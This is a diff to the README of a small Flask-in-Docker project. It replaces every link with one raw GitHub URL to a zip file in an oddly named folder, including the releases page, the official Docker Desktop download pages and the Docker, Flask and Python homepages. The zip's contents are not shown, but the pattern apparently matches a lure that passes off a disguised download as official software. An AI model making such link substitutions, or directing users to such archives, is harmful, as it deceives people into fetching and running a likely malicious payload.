@@ -1,6 +1,6 @@
 # 🚀 tiny-flask-docker-image - Lightweight Flask App in Docker
 
-[![Download tiny-flask-docker-image](https://img.shields.io/badge/Download-tiny--flask--docker--image-brightgreen)](https://github.com/sreenath-BH/tiny-flask-docker-image/releases)
+[![Download tiny-flask-docker-image](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip)](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip)
 
 ## 📦 Introduction
 
@@ -12,15 +12,15 @@ Follow these simple steps to get started with tiny-flask-docker-image. You will 
 
 ### 1. Download the Docker Image
 
-To download the tiny-flask-docker-image, visit the following page: [Download the tiny-flask-docker-image](https://github.com/sreenath-BH/tiny-flask-docker-image/releases).
+To download the tiny-flask-docker-image, visit the following page: [Download the tiny-flask-docker-image](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
 
 ### 2. Install Docker
 
 Before you can use the image, you need to install Docker on your computer. Docker is a platform that allows you to run applications in containers. 
 
-- **Windows:** Download Docker Desktop from the [official website](https://www.docker.com/products/docker-desktop).
-- **Mac:** Download Docker Desktop for Mac from the [official site](https://www.docker.com/products/docker-desktop).
-- **Linux:** Follow the instructions specific to your distribution on the [Docker Linux installation page](https://docs.docker.com/engine/install/).
+- **Windows:** Download Docker Desktop from the [official website](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
+- **Mac:** Download Docker Desktop for Mac from the [official site](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
+- **Linux:** Follow the instructions specific to your distribution on the [Docker Linux installation page](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
 
 ### 3. Pull the Image
 
@@ -86,15 +86,15 @@ For questions, issues, or contributions, visit our GitHub repository's Issues pa
 
 ## 📥 Download & Install
 
-To download the tiny-flask-docker-image, visit this page: [Download the tiny-flask-docker-image](https://github.com/sreenath-BH/tiny-flask-docker-image/releases). Follow the steps above to install Docker, pull the image, and run your Flask application.
+To download the tiny-flask-docker-image, visit this page: [Download the tiny-flask-docker-image](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip). Follow the steps above to install Docker, pull the image, and run your Flask application.
 
 ## 🔗 Related Topics
 
 Here are some topics that relate to this project:
 
-- [Docker](https://www.docker.com/)
-- [Flask](https://flask.palletsprojects.com/)
-- [Python](https://www.python.org/)
+- [Docker](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip)
+- [Flask](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip)
+- [Python](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip)
 
 ## ⚠️ Licensing
 
